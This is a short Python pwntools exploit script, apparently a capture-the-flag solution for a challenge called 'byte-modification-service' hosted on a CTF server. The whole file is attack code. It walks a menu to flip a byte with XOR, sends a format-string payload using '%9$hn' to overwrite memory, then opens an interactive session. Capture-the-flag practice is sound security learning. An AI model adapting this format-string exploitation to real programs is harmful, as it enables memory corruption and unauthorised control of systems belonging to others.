```python
from pwn import *

exe = ELF("./chall")


context.binary = exe


r = 0
debug = 1

if args.LOCAL:
	r = process([exe.path])

else:
	r = remote("byte-modification-service.challs.csc.tf", 1337)




def main():
	r.sendlineafter(b"want to use?", b"11")
	r.sendlineafter(b" Index?", b"0")
	r.sendlineafter(b"xor with?", f"{0xfa^0xbf}".encode())
	payload = f"%{0xfdf7}c%9$hn".encode()
	payload = payload + 7*b"A"
	r.sendafter(b"improve our service.", payload)

	r.interactive()


if __name__ == "__main__":
	main()
```
